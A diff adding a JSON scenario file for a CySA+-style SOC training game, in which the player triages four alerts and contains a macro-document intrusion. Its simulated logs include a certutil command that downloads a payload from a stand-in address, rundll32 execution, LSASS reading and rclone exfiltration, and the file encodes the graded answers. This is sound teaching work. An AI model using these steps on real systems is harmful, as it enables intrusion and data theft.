@@ -1,0 +1,1629 @@
+{
+  "schemaVersion": 1,
+  "engine": {
+    "major": 1,
+    "minor": 2
+  },
+  "slug": "alert-triage-lolbin-hunt",
+  "title": "Incident: four alerts and one intrusion",
+  "screen": {
+    "type": "security-console",
+    "level": 1,
+    "console": {
+      "alerts": [
+        {
+          "id": "av",
+          "severity": "critical",
+          "title": "Antivirus: Trojan.GenericKD quarantined on HR-LT22",
+          "detail": "Action: quarantined at 06:12. No other detection on the host since.",
+          "when": "true",
+          "at": "0",
+          "status": "{dAv == \"none\" ? \"New\" : dAv == \"incident\" ? \"Incident\" : dAv == \"handled\" ? \"Handled by a control\" : \"False positive\"}",
+          "open": "dAv == \"none\""
+        },
+        {
+          "id": "spray",
+          "severity": "high",
+          "title": "VPN: 41 failed sign-ins across 38 accounts from 198.51.100.14 in 10 minutes",
+          "detail": "Every attempt failed at the password step; no account locked out.",
+          "when": "true",
+          "at": "0",
+          "status": "{dSpray == \"none\" ? \"New\" : dSpray == \"incident\" ? \"Incident\" : dSpray == \"handled\" ? \"Handled by a control\" : \"False positive\"}",
+          "open": "dSpray == \"none\""
+        },
+        {
+          "id": "cert",
+          "severity": "medium",
+          "title": "EDR: certutil.exe made an outbound connection on FIN-WS07",
+          "detail": "Parent: powershell.exe -enc (user dmarsh). Destination 203.0.113.45:80.",
+          "when": "true",
+          "at": "0",
+          "status": "{dCert == \"none\" ? \"New\" : dCert == \"incident\" ? (attackerActive ? \"Incident: active\" : \"Incident: contained\") : dCert == \"handled\" ? \"Handled by a control\" : \"False positive\"}",
+          "open": "dCert == \"none\" or (dCert == \"incident\" and attackerActive)"
+        },
+        {
+          "id": "scan",
+          "severity": "low",
+          "title": "IDS: port sweep from 192.0.2.10 across the server VLAN",
+          "detail": "192.0.2.10 is the vulnerability scanner; its scheduled window is 06:00-08:00.",
+          "when": "true",
+          "at": "0",
+          "status": "{dScan == \"none\" ? \"New\" : dScan == \"incident\" ? \"Incident\" : dScan == \"handled\" ? \"Handled by a control\" : \"False positive\"}",
+          "open": "dScan == \"none\""
+        },
+        {
+          "id": "lsass",
+          "severity": "high",
+          "title": "EDR: rundll32.exe read LSASS memory on FIN-WS07",
+          "when": "not isNull(credsAt)",
+          "at": "timeAt(credsAt)",
+          "status": "{isNull(svcOffAt) ? \"New\" : \"Account disabled\"}",
+          "open": "credsLeft"
+        },
+        {
+          "id": "lateral",
+          "severity": "high",
+          "title": "svc-backup signed in to FIN-SQL01 from FIN-WS07 (network logon)",
+          "when": "not isNull(lateralAt)",
+          "at": "timeAt(lateralAt)",
+          "status": "{isNull(sqlIsoAt) ? \"New\" : \"Contained\"}",
+          "open": "isNull(sqlIsoAt)"
+        },
+        {
+          "id": "exfil",
+          "severity": "critical",
+          "title": "Proxy: rclone.exe uploading finance data to 203.0.113.80",
+          "when": "not isNull(exfilAt)",
+          "at": "timeAt(exfilAt)",
+          "status": "{not isNull(impactAt) ? \"Upload complete\" : attackerActive ? \"In progress\" : \"Stopped\"}",
+          "open": "attackerActive"
+        }
+      ],
+      "events": [
+        {
+          "id": "e1",
+          "source": "EDR",
+          "text": "06:41 WINWORD.EXE (dmarsh) -> cmd.exe -> powershell.exe -enc ...",
+          "when": "not isNull(timelineAt) or not isNull(huntedAt)",
+          "at": "0"
+        },
+        {
+          "id": "e2",
+          "source": "EDR",
+          "text": "06:42 powershell.exe -> certutil.exe -urlcache -split -f http://203.0.113.45/u.bin",
+          "when": "true",
+          "at": "0"
+        },
+        {
+          "id": "e3",
+          "source": "EDR",
+          "text": "06:43 rundll32.exe C:\\Users\\dmarsh\\AppData\\Local\\Temp\\u.bin,Start; beacon to 203.0.113.45:443 every 60 s",
+          "when": "not isNull(timelineAt) or not isNull(huntedAt)",
+          "at": "0"
+        },
+        {
+          "id": "e4",
+          "source": "Mail gateway",
+          "text": "06:38 dmarsh received 'Invoice_4471.docm' from billing@invoices.example.net",
+          "when": "not isNull(timelineAt)",
+          "at": "0"
+        },
+        {
+          "id": "e5",
+          "source": "VPN",
+          "text": "06:50-07:00 41 failures from 198.51.100.14; 0 successes",
+          "when": "true",
+          "at": "0"
+        },
+        {
+          "id": "e6",
+          "source": "EDR",
+          "text": "rundll32.exe opened lsass.exe with read access",
+          "when": "not isNull(credsAt)",
+          "at": "timeAt(credsAt)"
+        },
+        {
+          "id": "e7",
+          "source": "Windows security log",
+          "text": "FIN-SQL01: 4624 logon type 3, svc-backup, from FIN-WS07",
+          "when": "not isNull(lateralAt)",
+          "at": "timeAt(lateralAt)"
+        },
+        {
+          "id": "e8",
+          "source": "Proxy",
+          "text": "The beacon on FIN-WS07 switched to 203.0.113.46",
+          "when": "not isNull(newC2At)",
+          "at": "timeAt(newC2At)"
+        },
+        {
+          "id": "e9",
+          "source": "Proxy",
+          "text": "rclone.exe: HTTPS upload to 203.0.113.80 started",
+          "when": "not isNull(exfilAt)",
+          "at": "timeAt(exfilAt)"
+        },
+        {
+          "id": "e10",
+          "source": "Proxy",
+          "text": "rclone.exe: upload finished (2.4 GB)",
+          "when": "not isNull(impactAt)",
+          "at": "timeAt(impactAt)"
+        }
+      ],
+      "assets": [
+        {
+          "id": "ws07",
+          "label": "FIN-WS07",
+          "spokenLabel": "Workstation FIN-WS07",
+          "kind": "Finance workstation (dmarsh)",
+          "status": "{reimaged ? \"Reimaged\" : not isNull(wsIsoAt) ? \"Isolated by EDR\" : \"Online; implant beaconing\"}",
+          "tone": "not isNull(wsIsoAt) ? \"held\" : \"bad\""
+        },
+        {
+          "id": "sql01",
+          "label": "FIN-SQL01",
+          "spokenLabel": "Database server FIN-SQL01",
+          "kind": "Payments database server",
+          "status": "{not isNull(sqlIsoAt) ? \"Isolated by EDR\" : not isNull(lateralAt) ? \"Attacker signed in\" : \"Normal\"}",
+          "tone": "not isNull(sqlIsoAt) ? \"held\" : not isNull(lateralAt) ? \"bad\" : \"ok\""
+        },
+        {
+          "id": "svc",
+          "label": "svc-backup",
+          "spokenLabel": "Service account svc-backup",
+          "kind": "Backup service account (admin on finance servers)",
+          "status": "{not isNull(svcOffAt) ? \"Disabled; password reset\" : not isNull(credsAt) ? \"Credentials likely stolen\" : \"Normal\"}",
+          "tone": "not isNull(svcOffAt) ? \"held\" : not isNull(credsAt) ? \"bad\" : \"ok\""
+        },
+        {
+          "id": "lt22",
+          "label": "HR-LT22",
+          "spokenLabel": "Laptop HR-LT22",
+          "kind": "HR laptop",
+          "status": "{not isNull(ltIsoAt) ? \"Isolated by EDR\" : \"Threat quarantined by antivirus\"}",
+          "tone": "not isNull(ltIsoAt) ? \"held\" : \"watch\""
+        }
+      ],
+      "meters": [
+        {
+          "id": "evM",
+          "label": "Case file",
+          "value": "{isNull(evidenceAt) ? \"empty\" : \"FIN-WS07 memory and EDR triage package\"}{not isNull(evidenceAt) and not isNull(lateralAt) and timeAt(evidenceAt) >= timeAt(lateralAt) ? \", FIN-SQL01 triage package\" : \"\"}"
+        }
+      ]
+    }
+  },
+  "objective": "Given a scenario, assess: triage, establishment of a timeline, determining severity and impact, prioritization, escalation",
+  "secondaryObjectives": [
+    "Given a scenario, analyze host-related indicators: resource consumption, unauthorized software, unauthorized configuration, and anomalous activity -- suspicious or rogue processes, Living Off the Land Binaries (LOLBins) and Scripts, file system changes, data exfiltration",
+    "Given a scenario, contain and recover: isolating affected targets, remediation and verification, release from isolation, performing restoration"
+  ],
+  "sources": [
+    {
+      "cite": "CompTIA CySA+ CS0-004 Exam Objectives, Exam Objectives Document Version 2.0 (exam launched 2026-06-23; domains 34/26/24/16)",
+      "checkedAt": "2026-11-11",
+      "url": "https://www.comptia.org/en-us/certifications/cybersecurity-analyst/v4/",
+      "note": "Relevant text: 1.2 'Given a scenario, analyze indicators of potential malicious activity' (host-related indicators: resource consumption, unauthorized software, anomalous activity: suspicious or rogue processes, Living Off the Land Binaries (LOLBins) and Scripts, file system changes, data exfiltration); 2.3 'Given a scenario, analyze data to prioritize and mitigate vulnerabilities' (exploitability, active exploitation/threat intelligence, asset value, impact, patch/remediation availability, true/false positives, true/false negatives; CVSS metrics, EPSS); 3.2 'Summarize the incident response process' (containment, recovery); 3.3 'Given a scenario, implement incident response techniques' (triage, establishment of a timeline, determining severity and impact, escalation; isolating affected targets, remediation and verification, release from isolation, performing restoration). Read in the official objectives PDF (the course's officialObjectivesUrl) through a summarizing fetch, and the CompTIA V4 page, on 2026-11-11. CS0-003 retires for English on 2026-12-22."
+    },
+    {
+      "cite": "NIST SP 800-61 Rev. 3, Incident Response Recommendations and Considerations for Cybersecurity Risk Management: A CSF 2.0 Community Profile (April 2025)",
+      "checkedAt": "2026-11-11",
+      "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+      "note": "The current revision (April 3, 2025; supersedes Rev. 2 of 2012). Relevant text: RS.MA-02 'Perform a preliminary review of a new incident report to verify that a cybersecurity incident has occurred, then estimate the severity of the incident and the level of urgency'; RS.MA-03 'Prioritize how quickly incident response should be performed for each incident based on its scope, likely impact, time-critical nature, and resource availability'; RS.MA-04 escalation and elevation; RS.MI-01 'Containment refers to preventing the expansion of an incident'; RS.MI-02 eradication 'to eliminate persistence mechanisms and entry points' and 'Identify all affected hosts and services'; RS.AN-07 incident data collected with integrity and provenance preserved; RS.CO-02 stakeholders notified. Read in the PDF text (nvlpubs.nist.gov) and the CSRC page on 2026-11-11."
+    },
+    {
+      "cite": "MITRE ATT&CK: T1105 Ingress Tool Transfer, T1218.011 System Binary Proxy Execution: Rundll32, T1003.001 OS Credential Dumping: LSASS Memory",
+      "checkedAt": "2026-11-07",
+      "url": "https://attack.mitre.org/",
+      "note": "Technique names only, for the record form's vocabulary; certutil's -urlcache download and rundll32 execution are the living-off-the-land pattern the CySA+ course's own lab uses (seed labs/security-cysaplus.ts). The ATT&CK site was not re-read for this case; the names are as the course seed records them (read 2026-11-07)."
+    },
+    {
+      "cite": "CrowdStrike, 2026 Global Threat Report (press release, 2026-02-24): 'The average eCrime breakout time fell to just 29 minutes in 2025', the fastest observed 27 seconds",
+      "checkedAt": "2026-11-11",
+      "url": "https://www.crowdstrike.com/en-us/press-releases/2026-crowdstrike-global-threat-report/",
+      "note": "Vendor telemetry, not a standard. Also: '42% of vulnerabilities were exploited before public disclosure'; adversaries injected malicious prompts into GenAI tools at more than 90 organizations. Used only to set the scale of the attacker's clock; the scenario's step times are the author's. Read through a summarizing fetch on 2026-11-11."
+    },
+    {
+      "cite": "IETF RFC 5737 (IPv4 address blocks reserved for documentation: 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24)",
+      "checkedAt": "2026-11-11",
+      "url": "https://www.rfc-editor.org/rfc/rfc5737",
+      "note": "Every address in the scenario is reserved for documentation."
+    },
+    {
+      "cite": "IETF RFC 2606 (reserved top-level and second-level DNS names: example.com, example.net, example.org, .test, .example)",
+      "checkedAt": "2026-11-11",
+      "url": "https://www.rfc-editor.org/rfc/rfc2606",
+      "note": "Every domain in the scenario is reserved for documentation."
+    }
+  ],
+  "brief": {
+    "situation": "You are the analyst on the early shift in the security operations center (SOC) at Quillon Freight, a fictional logistics company. At 07:00 four alerts sit in the queue: a critical antivirus detection, a high-severity burst of VPN failures, a medium EDR alert about certutil, and a low IDS port sweep. One of them is a live intrusion. Triage them, contain what is real, preserve evidence and report.",
+    "handover": [
+      "EDR covers every Windows host and can network-isolate one. svc-backup is a service account with administrator rights on the finance servers.",
+      "The vulnerability scanner at 192.0.2.10 runs every weekday from 06:00 to 08:00."
+    ],
+    "howItWorks": [
+      "Each task takes analyst time: choose it, then let the work finish, which moves the clock by the minutes that task takes. The attacker keeps working on the same clock.",
+      "New alerts and log lines appear in the console as they happen.",
+      "When you declare the incident contained, you notify, write the record and explain your reasoning."
+    ]
+  },
+  "clock": {
+    "start": "07:00",
+    "tick": "1min",
+    "maxDuration": "180min",
+    "calendar": "clock"
+  },
+  "params": {
+    "credsDelay": {
+      "value": 900,
+      "unit": "s",
+      "source": {
+        "cite": "Author's scenario timing (REQ-238)",
+        "checkedAt": "2026-11-11",
+        "note": "How many sim minutes each task takes and when the fictional attacker (or other party) takes each step are teaching simplifications for exam practice, not measured values. The attacker's pace is set against the published breakout time in the sources."
+      }
+    },
+    "lateralDelay": {
+      "value": 1800,
+      "unit": "s",
+      "source": {
+        "cite": "Author's scenario timing (REQ-238)",
+        "checkedAt": "2026-11-11",
+        "note": "How many sim minutes each task takes and when the fictional attacker (or other party) takes each step are teaching simplifications for exam practice, not measured values. The attacker's pace is set against the published breakout time in the sources."
+      }
+    },
+    "newC2Delay": {
+      "value": 120,
+      "unit": "s",
+      "source": {
+        "cite": "Author's scenario timing (REQ-238)",
+        "checkedAt": "2026-11-11",
+        "note": "How many sim minutes each task takes and when the fictional attacker (or other party) takes each step are teaching simplifications for exam practice, not measured values. The attacker's pace is set against the published breakout time in the sources."
+      }
+    },
+    "exfilDelay": {
+      "value": 2700,
+      "unit": "s",
+      "source": {
+        "cite": "Author's scenario timing (REQ-238)",
+        "checkedAt": "2026-11-11",
+        "note": "How many sim minutes each task takes and when the fictional attacker (or other party) takes each step are teaching simplifications for exam practice, not measured values. The attacker's pace is set against the published breakout time in the sources."
+      }
+    },
+    "exfilDoneDelay": {
+      "value": 4200,
+      "unit": "s",
+      "source": {
+        "cite": "Author's scenario timing (REQ-238)",
+        "checkedAt": "2026-11-11",
+        "note": "How many sim minutes each task takes and when the fictional attacker (or other party) takes each step are teaching simplifications for exam practice, not measured values. The attacker's pace is set against the published breakout time in the sources."
+      }
+    },
+    "escalateWindow": {
+      "value": 900,
+      "unit": "s",
+      "source": {
+        "cite": "Author's scenario timing (REQ-238)",
+        "checkedAt": "2026-11-11",
+        "note": "Escalation to the incident lead within 15 minutes of the first alert; NIST SP 800-61r3 RS.MA-04 asks that incidents be escalated as needed, not by when."
+      }
+    }
+  },
+  "state": {
+    "busy": {
+      "type": "bool",
+      "init": false
+    },
+    "dCert": {
+      "type": "enum",
+      "values": [
+        "none",
+        "incident",
+        "handled",
+        "falsePos"
+      ],
+      "init": "none"
+    },
+    "dSpray": {
+      "type": "enum",
+      "values": [
+        "none",
+        "incident",
+        "handled",
+        "falsePos"
+      ],
+      "init": "none"
+    },
+    "dScan": {
+      "type": "enum",
+      "values": [
+        "none",
+        "incident",
+        "handled",
+        "falsePos"
+      ],
+      "init": "none"
+    },
+    "dAv": {
+      "type": "enum",
+      "values": [
+        "none",
+        "incident",
+        "handled",
+        "falsePos"
+      ],
+      "init": "none"
+    },
+    "certAt": {
+      "type": "time",
+      "init": null
+    },
+    "huntedAt": {
+      "type": "time",
+      "init": null
+    },
+    "timelineAt": {
+      "type": "time",
+      "init": null
+    },
+    "wsIsoAt": {
+      "type": "time",
+      "init": null
+    },
+    "sqlIsoAt": {
+      "type": "time",
+      "init": null
+    },
+    "ltIsoAt": {
+      "type": "time",
+      "init": null
+    },
+    "svcOffAt": {
+      "type": "time",
+      "init": null
+    },
+    "c2BlockAt": {
+      "type": "time",
+      "init": null
+    },
+    "newC2At": {
+      "type": "time",
+      "init": null
+    },
+    "credsAt": {
+      "type": "time",
+      "init": null
+    },
+    "lateralAt": {
+      "type": "time",
+      "init": null
+    },
+    "exfilAt": {
+      "type": "time",
+      "init": null
+    },
+    "impactAt": {
+      "type": "time",
+      "init": null
+    },
+    "allOffAt": {
+      "type": "time",
+      "init": null
+    },
+    "evidenceAt": {
+      "type": "time",
+      "init": null
+    },
+    "reimaged": {
+      "type": "bool",
+      "init": false
+    },
+    "evidenceDestroyed": {
+      "type": "bool",
+      "init": false
+    },
+    "causeDoc": {
+      "type": "enum",
+      "values": [
+        "none",
+        "maldoc",
+        "spray",
+        "scanner"
+      ],
+      "init": "none"
+    },
+    "scopeDoc": {
+      "type": "enum",
+      "values": [
+        "none",
+        "one",
+        "two",
+        "zero"
+      ],
+      "init": "none"
+    },
+    "escalatedAt": {
+      "type": "time",
+      "init": null
+    },
+    "closedAt": {
+      "type": "time",
+      "init": null
+    },
+    "notified": {
+      "type": "enum",
+      "values": [
+        "none",
+        "full",
+        "it",
+        "nobody"
+      ],
+      "init": "none"
+    },
+    "documented": {
+      "type": "bool",
+      "init": false
+    }
+  },
+  "derived": {
+    "attackerActive": {
+      "expr": "isNull(wsIsoAt) or (not isNull(lateralAt) and isNull(sqlIsoAt))"
+    },
+    "credsLeft": {
+      "expr": "not isNull(credsAt) and isNull(svcOffAt)"
+    },
+    "spread": {
+      "expr": "isNull(lateralAt) ? 0 : 1"
+    },
+    "triageRight": {
+      "expr": "dCert == \"incident\" and dSpray == \"handled\" and dScan == \"falsePos\" and dAv == \"handled\""
+    }
+  },
+  "processes": [],
+  "phases": {
+    "incident": {
+      "label": "Incident in progress",
+      "clock": "turns",
+      "actions": [
+        "triage",
+        "hunt",
+        "timeline",
+        "isolate",
+        "disableAccount",
+        "blockC2",
+        "collect",
+        "reimage",
+        "escalate",
+        "watch",
+        "closeIncident"
+      ]
+    },
+    "report": {
+      "label": "Report",
+      "clock": "stopped",
+      "actions": [
+        "notify",
+        "document"
+      ]
+    }
+  },
+  "initialPhase": "incident",
+  "actions": {
+    "triage": {
+      "label": "Set an alert's disposition",
+      "group": "Investigate",
+      "available": "not busy",
+      "why": "Finish the task in progress first.",
+      "params": [
+        {
+          "id": "d",
+          "kind": "form",
+          "label": "Disposition",
+          "fields": [
+            {
+              "id": "alert",
+              "label": "Alert",
+              "options": [
+                {
+                  "value": "cert",
+                  "label": "certutil on FIN-WS07"
+                },
+                {
+                  "value": "spray",
+                  "label": "VPN failures from 198.51.100.14"
+                },
+                {
+                  "value": "scan",
+                  "label": "Port sweep from 192.0.2.10"
+                },
+                {
+                  "value": "av",
+                  "label": "Quarantine on HR-LT22"
+                }
+              ]
+            },
+            {
+              "id": "verdict",
+              "label": "Verdict",
+              "options": [
+                {
+                  "value": "incident",
+                  "label": "True positive: open an incident"
+                },
+                {
+                  "value": "handled",
+                  "label": "True positive, already stopped by a control"
+                },
+                {
+                  "value": "falsePos",
+                  "label": "False positive (tune the rule)"
+                }
+              ]
+            }
+          ]
+        }
+      ],
+      "effects": [
+        {
+          "cases": [
+            {
+              "when": "alert == \"cert\"",
+              "then": [
+                {
+                  "set": "dCert",
+                  "to": "verdict"
+                },
+                {
+                  "if": "verdict == \"incident\"",
+                  "then": [
+                    {
+                      "if": "isNull(certAt)",
+                      "then": [
+                        {
+                          "set": "certAt",
+                          "to": "t"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "log": "certutil on FIN-WS07: {verdict == \"incident\" ? \"incident; a LOLBin downloading code from an outside address\" : verdict == \"handled\" ? \"marked handled\" : \"closed as a false positive\"}.",
+                  "kind": "act"
+                }
+              ]
+            },
+            {
+              "when": "alert == \"spray\"",
+              "then": [
+                {
+                  "set": "dSpray",
+                  "to": "verdict"
+                },
+                {
+                  "log": "VPN failures from 198.51.100.14: {verdict == \"incident\" ? \"incident\" : verdict == \"handled\" ? \"handled by a control\" : \"false positive\"}.",
+                  "kind": "act"
+                }
+              ]
+            },
+            {
+              "when": "alert == \"scan\"",
+              "then": [
+                {
+                  "set": "dScan",
+                  "to": "verdict"
+                },
+                {
+                  "log": "Port sweep from 192.0.2.10: {verdict == \"incident\" ? \"incident\" : verdict == \"handled\" ? \"handled by a control\" : \"false positive\"}.",
+                  "kind": "act"
+                }
+              ]
+            },
+            {
+              "when": "true",
+              "then": [
+                {
+                  "set": "dAv",
+                  "to": "verdict"
+                },
+                {
+                  "log": "HR-LT22 quarantine: {verdict == \"incident\" ? \"incident\" : verdict == \"handled\" ? \"handled by a control\" : \"false positive\"}.",
+                  "kind": "act"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "finding": "{alert == \"cert\" ? \"certutil.exe fetched u.bin from 203.0.113.45 with -urlcache, launched by an encoded PowerShell command; rundll32.exe then ran the file and beacons every 60 s. Office spawning a shell and certutil downloading are living-off-the-land indicators.\" : alert == \"spray\" ? \"41 failures across 38 accounts from one address, none successful and none locked out: a password spray that the VPN stopped. Nothing got in.\" : alert == \"scan\" ? \"192.0.2.10 is the vulnerability scanner inside its scheduled window; the sweep matches its weekly job.\" : \"The antivirus quarantined the file before it ran; there has been no detection, process or connection from it since.\"}"
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "3min"
+        }
+      ]
+    },
+    "hunt": {
+      "label": "Hunt every endpoint for the certutil and rundll32 pattern and the beacon addresses",
+      "group": "Investigate",
+      "available": "not busy and (isNull(huntedAt) or (not isNull(lateralAt) and timeAt(lateralAt) > timeAt(huntedAt)) or (not isNull(credsAt) and timeAt(credsAt) > timeAt(huntedAt)))",
+      "why": "Hunted; nothing new since.",
+      "effects": [
+        {
+          "set": "huntedAt",
+          "to": "t"
+        },
+        {
+          "log": "You query EDR telemetry from every endpoint for certutil with -urlcache, rundll32 running files from Temp, and connections to 203.0.113.0/24.",
+          "kind": "act"
+        },
+        {
+          "finding": "FIN-WS07 only{isNull(lateralAt) ? \"; no other host shows the pattern\" : \", and svc-backup network logons from FIN-WS07 to FIN-SQL01, where rclone.exe now sits\"}{isNull(credsAt) ? \"\" : \"; LSASS was read on FIN-WS07, so treat every credential cached there as stolen (svc-backup was signed in)\"}."
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "8min"
+        }
+      ]
+    },
+    "timeline": {
+      "label": "Build a timeline from mail, EDR and proxy logs",
+      "group": "Investigate",
+      "available": "not busy and (isNull(timelineAt))",
+      "why": "Built.",
+      "effects": [
+        {
+          "set": "timelineAt",
+          "to": "t"
+        },
+        {
+          "log": "You line up the mail gateway, EDR and proxy records for FIN-WS07.",
+          "kind": "act"
+        },
+        {
+          "finding": "06:38 dmarsh received Invoice_4471.docm from an outside sender; 06:41 Word started cmd and an encoded PowerShell; 06:42 certutil downloaded u.bin; 06:43 rundll32 ran it and the beacon began. Initial access was a macro document; the VPN failures are unrelated."
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "6min"
+        }
+      ]
+    },
+    "isolate": {
+      "label": "Isolate a host with EDR",
+      "group": "Contain",
+      "available": "not busy",
+      "why": "Finish the task in progress first.",
+      "params": [
+        {
+          "id": "host",
+          "kind": "choice",
+          "label": "Host",
+          "options": [
+            {
+              "value": "ws07",
+              "label": "FIN-WS07"
+            },
+            {
+              "value": "sql01",
+              "label": "FIN-SQL01"
+            },
+            {
+              "value": "lt22",
+              "label": "HR-LT22"
+            }
+          ]
+        }
+      ],
+      "effects": [
+        {
+          "cases": [
+            {
+              "when": "host == \"ws07\"",
+              "then": [
+                {
+                  "if": "isNull(wsIsoAt)",
+                  "then": [
+                    {
+                      "set": "wsIsoAt",
+                      "to": "t"
+                    }
+                  ]
+                },
+                {
+                  "log": "FIN-WS07 network-isolated by EDR; it can still reach the EDR console.",
+                  "kind": "act"
+                }
+              ]
+            },
+            {
+              "when": "host == \"sql01\"",
+              "then": [
+                {
+                  "if": "isNull(sqlIsoAt)",
+                  "then": [
+                    {
+                      "set": "sqlIsoAt",
+                      "to": "t"
+                    }
+                  ]
+                },
+                {
+                  "log": "FIN-SQL01 network-isolated by EDR{isNull(lateralAt) ? \"; the payments database is offline for finance and nothing pointed to it\" : \"\"}.",
+                  "kind": "act"
+                }
+              ]
+            },
+            {
+              "when": "true",
+              "then": [
+                {
+                  "if": "isNull(ltIsoAt)",
+                  "then": [
+                    {
+                      "set": "ltIsoAt",
+                      "to": "t"
+                    }
+                  ]
+                },
+                {
+                  "log": "HR-LT22 network-isolated by EDR.",
+                  "kind": "act"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "if": "not attackerActive and not credsLeft",
+          "then": [
+            {
+              "if": "isNull(allOffAt)",
+              "then": [
+                {
+                  "set": "allOffAt",
+                  "to": "t"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "2min"
+        }
+      ]
+    },
+    "disableAccount": {
+      "label": "Disable svc-backup and reset its password",
+      "group": "Contain",
+      "available": "not busy and (isNull(svcOffAt))",
+      "why": "Done.",
+      "effects": [
+        {
+          "if": "isNull(svcOffAt)",
+          "then": [
+            {
+              "set": "svcOffAt",
+              "to": "t"
+            }
+          ]
+        },
+        {
+          "log": "svc-backup disabled and its password reset; tonight's backup job is paused until it runs under the new password.",
+          "kind": "act"
+        },
+        {
+          "if": "not attackerActive and not credsLeft",
+          "then": [
+            {
+              "if": "isNull(allOffAt)",
+              "then": [
+                {
+                  "set": "allOffAt",
+                  "to": "t"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "3min"
+        }
+      ]
+    },
+    "blockC2": {
+      "label": "Block 203.0.113.45 at the proxy and firewall",
+      "group": "Contain",
+      "available": "not busy and (isNull(c2BlockAt))",
+      "why": "Blocked.",
+      "effects": [
+        {
+          "if": "isNull(c2BlockAt)",
+          "then": [
+            {
+              "set": "c2BlockAt",
+              "to": "t"
+            }
+          ]
+        },
+        {
+          "log": "203.0.113.45 is blocked at the proxy and the firewall.",
+          "kind": "act"
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "3min"
+        }
+      ]
+    },
+    "collect": {
+      "label": "Collect memory and the EDR triage package",
+      "group": "Evidence",
+      "available": "not busy and (not reimaged and (isNull(evidenceAt) or (not isNull(lateralAt) and timeAt(evidenceAt) < timeAt(lateralAt))))",
+      "why": "Collected; nothing new to keep.",
+      "effects": [
+        {
+          "set": "evidenceAt",
+          "to": "t"
+        },
+        {
+          "log": "You capture memory from FIN-WS07{not isNull(lateralAt) ? \" and FIN-SQL01\" : \"\"} and pull the EDR triage packages (process tree, prefetch, event logs) into the case file, with hashes.",
+          "kind": "act"
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "10min"
+        }
+      ]
+    },
+    "reimage": {
+      "label": "Reimage FIN-WS07",
+      "group": "Recover",
+      "available": "not busy and (not reimaged)",
+      "why": "Already reimaged.",
+      "effects": [
+        {
+          "set": "reimaged",
+          "to": "true"
+        },
+        {
+          "if": "isNull(evidenceAt)",
+          "then": [
+            {
+              "set": "evidenceDestroyed",
+              "to": "true"
+            }
+          ]
+        },
+        {
+          "if": "isNull(wsIsoAt)",
+          "then": [
+            {
+              "set": "wsIsoAt",
+              "to": "t"
+            }
+          ]
+        },
+        {
+          "log": "FIN-WS07 wiped and reimaged{isNull(evidenceAt) ? \" with no memory capture or triage package taken first\" : \"\"}.",
+          "kind": "act"
+        },
+        {
+          "if": "not attackerActive and not credsLeft",
+          "then": [
+            {
+              "if": "isNull(allOffAt)",
+              "then": [
+                {
+                  "set": "allOffAt",
+                  "to": "t"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "20min"
+        }
+      ]
+    },
+    "escalate": {
+      "label": "Escalate to the incident response lead",
+      "group": "Communicate",
+      "available": "not busy and (isNull(escalatedAt))",
+      "why": "Escalated.",
+      "effects": [
+        {
+          "set": "escalatedAt",
+          "to": "t"
+        },
+        {
+          "log": "You declare a security incident and page the incident response lead.",
+          "kind": "act"
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "2min"
+        }
+      ]
+    },
+    "watch": {
+      "label": "Keep watching the console (10 min)",
+      "group": "Wait",
+      "available": "not busy",
+      "why": "Finish the task in progress first.",
+      "effects": [
+        {
+          "log": "You watch the queue and the logs for 10 minutes.",
+          "kind": "act"
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "10min"
+        }
+      ]
+    },
+    "closeIncident": {
+      "label": "Declare the incident contained and write the report",
+      "group": "Close",
+      "available": "not busy",
+      "why": "Finish the task in progress first.",
+      "effects": [
+        {
+          "cancel": "work"
+        },
+        {
+          "set": "busy",
+          "to": "false"
+        },
+        {
+          "set": "closedAt",
+          "to": "t"
+        },
+        {
+          "log": "You close the incident phase and start the report.",
+          "kind": "act"
+        },
+        {
+          "phase": "report"
+        }
+      ]
+    },
+    "notify": {
+      "label": "Notify stakeholders",
+      "group": "Report",
+      "available": "notified == \"none\"",
+      "why": "Done.",
+      "params": [
+        {
+          "id": "who",
+          "kind": "choice",
+          "label": "Who you notify",
+          "options": [
+            {
+              "value": "full",
+              "label": "Incident lead, IT operations and the finance director (finance data may be involved)"
+            },
+            {
+              "value": "it",
+              "label": "IT operations only"
+            },
+            {
+              "value": "nobody",
+              "label": "No one"
+            }
+          ]
+        }
+      ],
+      "effects": [
+        {
+          "set": "notified",
+          "to": "who"
+        },
+        {
+          "log": "Notified: {who == \"full\" ? \"incident lead, IT operations and the finance director\" : who == \"it\" ? \"IT operations only\" : \"no one\"}.",
+          "kind": "act"
+        }
+      ]
+    },
+    "document": {
+      "label": "Write the incident record",
+      "group": "Report",
+      "available": "not documented",
+      "why": "Done.",
+      "params": [
+        {
+          "id": "record",
+          "kind": "form",
+          "label": "Record",
+          "fields": [
+            {
+              "id": "cause",
+              "label": "Initial access",
+              "options": [
+                {
+                  "value": "maldoc",
+                  "label": "A macro document opened by dmarsh; certutil and rundll32 (living-off-the-land binaries) fetched and ran the implant"
+                },
+                {
+                  "value": "spray",
+                  "label": "The VPN password spray"
+                },
+                {
+                  "value": "scanner",
+                  "label": "The vulnerability scanner"
+                }
+              ]
+            },
+            {
+              "id": "scope",
+              "label": "Hosts compromised",
+              "options": [
+                {
+                  "value": "one",
+                  "label": "FIN-WS07"
+                },
+                {
+                  "value": "two",
